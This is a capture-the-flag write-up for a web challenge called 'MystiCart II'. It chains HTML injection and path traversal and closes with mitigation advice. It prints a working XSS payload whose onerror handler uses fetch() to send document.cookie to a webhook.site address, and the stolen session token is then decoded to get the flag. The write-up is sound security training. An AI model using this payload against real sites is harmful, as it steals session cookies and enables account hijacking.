MystiCart II

Target IP: 83.136.252.13:51786

I entered the IP into the search bar of a browser and was meet with this page:

<img width="468" height="298" alt="image" src="https://github.com/user-attachments/assets/f966399a-a422-4cdd-9a69-f608189f4cf7" />

I see input box and multiple buttons. So I opened up Burp Suite and set up a proxy

<img width="468" height="298" alt="image" src="https://github.com/user-attachments/assets/66525c61-8488-4006-b02b-9b13bea40134" />

When I press About or Your Cart nothing is picked up with intercept on. The only response is with search.

I tried url encoded SQL injection but this did not work. This means that there is protection against SQL injection. I tried URL encoded HTML injection.
This succeeded

<img width="468" height="286" alt="image" src="https://github.com/user-attachments/assets/cdfd120d-6890-467a-a148-bd8aef07b11b" />

While looking around I found this:

<img width="468" height="298" alt="image" src="https://github.com/user-attachments/assets/96cf5148-165f-4a9a-9786-5bbab6233636" />

There is a GET request with /report?id=1

This parameter can be modified.

When I changed 1 to ../admin/dashboard/ I got a 200 OK. This means that there is no authorization check.

I created a unique URL for data leakage and command injection from webhook.site.

<img width="468" height="287" alt="image" src="https://github.com/user-attachments/assets/318a8f21-9cd5-41b9-a519-d1dc21250e65" />

The command I used for injection is:
..%3Fsearch=<img+src=x+onerror='fetch(`//webhook.site/165bf67d-834a-4093-b1dd-641b793384fd?x=`%252Bdocument.cookie)'>

I got a 200 OK

When I checked my webhook site I received a session key.

<img width="468" height="297" alt="image" src="https://github.com/user-attachments/assets/47b2c05d-adb7-4c98-83d6-e59357350305" />

I copied and pasted it into cyberchef. Set it to magic and from there you can partially see the flag:

<img width="468" height="296" alt="image" src="https://github.com/user-attachments/assets/cb44ace5-3f61-4104-a82e-3a94e02aa405" />

When I clicked JWT_Decode() it revealed the entire flag

<img width="1674" height="1046" alt="image" src="https://github.com/user-attachments/assets/62242b51-689b-4a38-a265-6f8e118afa7e" />

Risk Mitigation Strategy:

The biggest vulnerability here was the fact that I was able to put any input for the /report?id= section. There is no reason that should be the case. I immediately caught on to that. All the other products have their respective numbers. My recommendation would be to only allow numerical input and with a limit which in this case would be 8 as there is only 8 products. Another method would be limiting file access with something called static mapping. Instead of concatenating the report ID into a path, map each report ID to a corresponding filename. Also sandbox the directories so you can’t work your way up to another directory. With how easy it was to obtain the cookie which allowed me to conduct session hijacking there need to be some secure cookie attributes. Such as adding HttpOnly, Secure and SameSite set to strict. 

